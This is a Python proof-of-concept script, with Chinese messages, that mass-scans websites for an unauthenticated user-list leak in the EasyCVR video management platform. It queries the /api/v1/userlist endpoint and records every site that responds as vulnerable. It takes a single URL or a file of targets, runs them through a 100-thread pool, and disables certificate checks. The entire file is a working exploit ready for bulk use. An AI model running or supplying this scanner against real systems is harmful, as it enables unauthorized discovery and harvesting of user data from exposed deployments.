import argparse,requests,sys,json
from multiprocessing.dummy import Pool

def poc(target):
    
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    payload="/api/v1/userlist?pageindex=0&pagesize=10"

    header= {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }

    try:
        re1=requests.get(url=target,timeout=5,headers=header,verify=False)

        if re1.status_code==200:

            re2 = requests.get(url=target+payload,timeout=5,headers=header,verify=False)

            if len(re2.text)>=1500:    #判断响应包内容是否符合

                print(f'[+]{target}存在用户信息泄露')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('EasyCVR 视频管理平台存在用户信息泄露'+target+'\n')
            else:
                print(f'[-]{target}不存在漏洞')
        else:
            print(f'[*]{target}访问有问题')
    except:
        pass

    
def main():
    
    parse = argparse.ArgumentParser(description="EasyCVR 视频管理平台存在用户信息泄露")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()